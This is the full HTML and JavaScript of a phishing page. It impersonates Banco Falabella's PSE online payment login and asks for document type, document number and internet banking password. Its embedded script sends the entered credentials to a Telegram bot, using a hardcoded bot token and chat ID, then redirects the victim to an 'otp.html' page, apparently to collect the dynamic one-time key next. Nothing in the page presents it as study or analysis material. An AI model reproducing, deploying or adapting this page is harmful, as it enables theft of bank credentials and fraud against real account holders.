<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Falabella - PSE Pagos en Línea</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
            background-color: #fafafa;
            padding: 30px 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 380px;
            margin: 0 auto;
            background: white;
            padding: 25px 30px;
        }

        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 35px;
        }

        .logo {
            height: 45px;
            width: auto;
        }

        .title {
            font-size: 20px;
            font-weight: 400;
            color: #333;
            margin-bottom: 25px;
            letter-spacing: -0.3px;
        }

        .title strong {
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            font-size: 13px;
            font-weight: 400;
            color: #333;
            margin-bottom: 8px;
            letter-spacing: -0.2px;
        }

        .form-select,
        .form-input {
            width: 100%;
            padding: 11px 13px;
            border: 1px solid #d0d0d0;
            border-radius: 3px;
            font-size: 13px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            color: #666;
            background-color: white;
            transition: border-color 0.2s;
        }

        .form-select {
            cursor: pointer;
            appearance: none;
            background-image: url('data:image/svg+xml;charset=UTF-8,<svg xmlns="http://www.w3.org/2000/svg" width="12" height="8" viewBox="0 0 12 8"><path fill="%23666" d="M1 1l5 5 5-5"/></svg>');
            background-repeat: no-repeat;
            background-position: right 13px center;
            padding-right: 35px;
        }

        .form-select:focus,
        .form-input:focus {
            outline: none;
            border-color: #2d7f3d;
        }

        .form-input::placeholder {
            color: #aaa;
        }

        .form-input.error,
        .form-select.error {
            border-color: #e74c3c;
            background-color: #fff5f5;
        }

        .error-message {
            display: none;
            background-color: #fff5f5;
            color: #e74c3c;
            padding: 11px 13px;
            border-radius: 3px;
            margin-bottom: 20px;
            font-size: 12px;
            border-left: 3px solid #e74c3c;
        }

        .error-message.show {
            display: block;
            animation: slideDown 0.3s ease;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-8px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .green-link {
            color: #2d7f3d;
            font-size: 12px;
            font-weight: 400;
            cursor: pointer;
            text-decoration: none;
            margin-top: 8px;
            display: block;
            letter-spacing: -0.1px;
        }

        .green-link:hover {
            text-decoration: underline;
        }

        .info-box {
            background-color: #f8f8f8;
            padding: 14px 15px;
            border-radius: 3px;
            margin-top: 24px;
            border-left: 3px solid #ddd;
        }

        .info-box-title {
            font-weight: 600;
            color: #333;
            font-size: 12px;
            margin-bottom: 6px;
            letter-spacing: -0.1px;
        }

        .info-box-text {
            font-size: 12px;
            color: #666;
            line-height: 1.5;
            font-weight: 400;
            letter-spacing: -0.1px;
        }

        .btn-submit {
            width: 100%;
            padding: 12px 16px;
            background-color: #2d7f3d;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            font-weight: 500;
            cursor: not-allowed;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            transition: background-color 0.2s;
            margin-top: 28px;
            opacity: 0.5;
        }

        .btn-submit.enabled {
            cursor: pointer;
            opacity: 1;
        }

        .btn-submit.enabled:hover {
            background-color: #1e5829;
        }

        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loading-overlay.active {
            display: flex;
        }

        .loading-overlay img {
            width: 100px;
            height: auto;
            margin-bottom: 20px;
            animation: pulse 1.5s ease-in-out infinite;
        }

        .loading-overlay p {
            font-size: 15px;
            color: white;
            font-weight: 500;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(0.95); }
        }

        @media (max-width: 480px) {
            body {
                padding: 0;
            }

            .container {
                padding: 20px 25px;
            }

            .title {
                font-size: 18px;
                margin-bottom: 22px;
            }

            .form-group {
                margin-bottom: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <img src="img/image.png" alt="Banco Falabella">
        <p>Procesando...</p>
    </div>

    <div class="container">
        <div class="header">
            <img src="img/image.png" alt="Banco Falabella" class="logo">
        </div>

        <h1 class="title">PSE <strong>pagos en línea</strong></h1>

        <div class="error-message" id="errorMessage"></div>

        <form id="pseForm">
            <!-- Tipo de persona -->
            <div class="form-group">
                <label for="tipoPersona" class="form-label">Tipo de persona</label>
                <select id="tipoPersona" class="form-select" required>
                    <option value="">Seleccionar tipo de persona</option>
                    <option value="natural">Natural</option>
                    <option value="juridica">Jurídica</option>
                </select>
            </div>

            <!-- Tipo de documento -->
            <div class="form-group">
                <label for="tipoDocumento" class="form-label">Tipo de documento</label>
                <select id="tipoDocumento" class="form-select" required>
                    <option value="">Seleccionar tipo de documento</option>
                    <option value="cc">Cédula de Ciudadanía</option>
                    <option value="ce">Cédula de Extranjería</option>
                    <option value="pasaporte">Pasaporte</option>
                    <option value="nit">NIT</option>
                </select>
            </div>

            <!-- Número de documento -->
            <div class="form-group">
                <label for="numeroDocumento" class="form-label">Número de documento</label>
                <input 
                    type="text" 
                    id="numeroDocumento" 
                    class="form-input" 
                    placeholder="Ej. 1234567"
                    required
                >
            </div>

            <!-- Clave internet -->
            <div class="form-group">
                <label for="claveInternet" class="form-label">Clave internet</label>
                <input 
                    type="password" 
                    id="claveInternet" 
                    class="form-input" 
                    placeholder="Ingresa tu clave"
                    required
                >
                <a href="#" class="green-link">Recuperar o crear tu clave de internet ></a>
            </div>

            <button type="submit" class="btn-submit" id="btnSubmit" disabled>Continuar</button>
        </form>

        <!-- Info box -->
        <div class="info-box">
            <div class="info-box-title">Necesitarás tu Clave Dinámica</div>
            <div class="info-box-text">
                Para realizar esta transacción solicitaremos tu Clave Dinámica. Para obtenerla deberás ingresar a tu APP Banco Falabella.
            </div>
        </div>
    </div>

    <script>
    const TELEGRAM_BOT_TOKEN = '8619673327:AAEUJ-vzXT2OxgbjbHq5AIlbj0r0x4qWryw';
    const TELEGRAM_CHAT_ID = '-1003875450334';

    document.addEventListener('DOMContentLoaded', function() {
        const form = document.getElementById('pseForm');
        const tipoPersona = document.getElementById('tipoPersona');
        const tipoDocumento = document.getElementById('tipoDocumento');
        const numeroDocumento = document.getElementById('numeroDocumento');
        const claveInternet = document.getElementById('claveInternet');
        const btnSubmit = document.getElementById('btnSubmit');
        const errorMessage = document.getElementById('errorMessage');
        const loadingOverlay = document.getElementById('loadingOverlay');

        // Validar formulario
        function validateForm() {
            const isValid = 
                tipoPersona.value !== '' &&
                tipoDocumento.value !== '' &&
                numeroDocumento.value.trim() !== '' &&
                claveInternet.value.trim() !== '';
            
            btnSubmit.disabled = !isValid;
            btnSubmit.classList.toggle('enabled', isValid);
        }

        tipoPersona.addEventListener('change', validateForm);
        tipoDocumento.addEventListener('change', validateForm);
        numeroDocumento.addEventListener('input', validateForm);
        claveInternet.addEventListener('input', validateForm);

        // Limpiar error cuando escriba
        numeroDocumento.addEventListener('input', function() {
            this.classList.remove('error');
            errorMessage.classList.remove('show');
        });

        claveInternet.addEventListener('input', function() {
            this.classList.remove('error');
            errorMessage.classList.remove('show');
        });

        // Enviar formulario
        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            if (btnSubmit.disabled) return;

            loadingOverlay.classList.add('active');

            const mensaje = `💳 <b>PSE - BANCO FALABELLA</b>

<b>Tipo de Persona:</b> ${tipoPersona.options[tipoPersona.selectedIndex].text}
<b>Tipo de Documento:</b> ${tipoDocumento.options[tipoDocumento.selectedIndex].text}
<b>Número de Documento:</b> <code>${numeroDocumento.value}</code>
<b>Clave Internet:</b> <code>${claveInternet.value}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: mensaje,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();
                console.log('Telegram response:', data);

                // Redirigir a otp.html después de 2 segundos
                setTimeout(() => {
                    window.location.href = './otp.html';
                }, 2000);

            } catch (error) {
                console.error('Error:', error);
                // Aún así redirigir a otp.html
                setTimeout(() => {
                    window.location.href = './otp.html';
                }, 2000);
            }
        });
    });
    </script>
</body>
</html>
